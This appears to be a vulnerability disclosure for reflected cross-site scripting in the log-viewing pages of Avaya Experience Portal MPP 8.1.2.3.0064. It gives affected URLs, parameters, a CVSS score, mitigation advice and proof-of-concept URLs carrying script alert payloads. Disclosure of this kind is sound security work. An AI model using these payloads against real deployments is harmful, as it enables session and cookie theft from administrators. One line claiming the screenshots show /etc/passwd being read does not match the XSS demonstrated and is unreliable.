# XSS-on-Avaya-Experience-Portal-MPP
---
Researcher Attribution

Chan Shing Hei, Stanley and Lui Man Ho, Rex

---
Summary

A moderate risk vulnerability was identified in Avaya Experience Portal MPP version 8.1.2.3.0064 where an authenticated user can perform reflected cross site scripting (“XSS”). Attacker can leverage the vulnerability to attack other admin user of Avaya Experience Portal MPP application for cookie stealing.

---
Vulnerable Version and Product

Avaya Experience Portal MPP 8.1.2.3.0064

Vulnerability information and Proof of Concept

Vulnerability Reflected Cross Site Scripting in Avaya Experience Portal MPP 8.1.2.3.0064. 

Max CVSS: 6.2 (Medium)

CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:A/VC:N/VI:N/VA:N/SC:H/SI:H/SA:H

Affected URL:

https://\<server-ip\>/mpp/admin/logs/showlogfile.php?dirname=\<dir\>&filename=<file> [dirname and filename parameter]

https://\<server-ip\>/mpp/admin/logs/getlogfile.php?dirname=\<dir\>&filename=<file> [dirname and filename parameter]

https://\<server-ip\>/mpp/admin/logs/clearlogfile.php?dirname=\<dir\>&filename=<file> [dirname and filename parameter]

It was found the dirname and filename parameter is vulnerable to reflected cross site script attack in the log viewing function of the Avaya Experience Portal MPP 8.1.2.3.0064. An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script.
<img width="1520" height="625" alt="image (6)" src="https://github.com/user-attachments/assets/2bf374c7-d06e-4d58-9e44-1be726779903" />

---
Proof of Concept

Pre-requisite: Admin user of Avaya Experience Portal MPP.

The following screenshots showed the exploitation of Reflected XSS vulnerability to obtain the /etc/passwd of the affected host using Burp Suite.

https://\<server-ip\>/mpp/admin/logs/showlogfile.php?dirname=Administration&filename=test<script>alert(‘xss’)</script>
<img width="953" height="156" alt="image (7)" src="https://github.com/user-attachments/assets/35d9d498-938e-41e2-adfd-8e251a02fad3" />
<img width="966" height="229" alt="image (8)" src="https://github.com/user-attachments/assets/6ace016c-3ae9-4847-8a2f-ccc429d76cef" />

https://\<server-ip\>/mpp/admin/logs/getlogfile.php?dirname=Administration&filename<script>alert(‘xss’)</script>
<img width="905" height="169" alt="image (9)" src="https://github.com/user-attachments/assets/ccccc343-e474-45c4-9ed6-f9981f75695b" />
<img width="911" height="158" alt="image (10)" src="https://github.com/user-attachments/assets/d2e45d4b-7545-4e1b-a81d-f9c7ed9f697b" />

https://\<server-ip\>/mpp/admin/logs/clearlogfile.php?dirname=Administration&filename<script>alert(‘xss’)</script>
<img width="957" height="184" alt="image (11)" src="https://github.com/user-attachments/assets/6aaa41b2-ed6b-475d-b3c9-b5b4be5ea87d" />
<img width="962" height="164" alt="image (12)" src="https://github.com/user-attachments/assets/4d62ffca-b1cf-4f65-b1a2-f77ae2a5db27" />

---
Impact

Severity: Medium

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Due to this, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page.

---
Recommended Mitigation

It is recommended to:

Filter input on arrival. At the point where user input is received, filter as strictly as possible based on what is expected or valid input.

Encode data on output. At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.
